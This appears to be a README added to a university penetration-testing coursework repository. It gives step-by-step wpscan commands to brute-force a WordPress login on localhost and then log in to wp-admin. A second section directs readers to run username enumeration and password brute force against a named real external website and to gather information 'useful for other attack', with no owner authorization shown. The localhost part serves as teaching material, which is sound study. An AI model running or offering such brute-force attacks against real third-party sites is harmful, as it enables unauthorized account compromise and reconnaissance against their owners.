@@ -1,0 +1,41 @@
+ ---------------------------------------------------------------
+	    Brute force demonstration step by step
+       _ +-------------------------------------------+ _
+      /o)|        CSCM28 Penetration Testing         |(o\
+     / / |            Second Coursework              | \ \
+    ( (_ |  _                                     _  | _) )
+   ((\ \)+-/o)-----------------------------------(o\-+(/ /))
+   (\\\ \_/ /                                     \ \_/ ///)
+    \      /                                       \      /
+     \____/                                         \____/
+================================================================
+		>>>>>  PREREQUISITE <<<<<<
+================================================================
+
+- Kali virtual machine, please download the image here:  
+https://swanseauniversity-my.sharepoint.com/:f:/g/personal/2133203_swansea_ac_uk/EiZiR6aKVDdOj8WrvzJ4hVwBXVGfzy6Xy6Q9KiR6CxxPZg?e=JcEGIW
+- Running virtual machine using Oracle VM Virtual Box, or other apps related.
+
+
+================================================================
+	    >>>>>  BRUTE FORCE USING WPSCAN  <<<<<<
+================================================================
+1. Open terminal with root priviledge
+2. Check user.txt and pass.txt exist in Desktop
+3. Type this command:
+wpscan --url http://localhost/ -U /home/kali/Desktop/user.txt -P /home/kali/Desktop/pass.txt
+4. After few seconds, you will get the matched of username and password for wordpress login.
+5. Try to login with user and password you get. Open web browser and type
+localhost/wp-admin
+
+
+>>>> if you want to try to attack external site (for CSCM28 purposes only)
+	1.  Try to brute force this website: https://ppiuk.id
+	2.  type this command:
+		wpscan --url https://ppiuk.id/ -e u --passwords /home/kali/Desktop/pass.txt
+	3. Wpscan will not successful, but we get some informations that will be useful for other attack
+
+================================================================
+  	 FESTY WINDA SARI	 2133203
+	 UMMI AISHATU IBRAHIM	 940165      
+================================================================
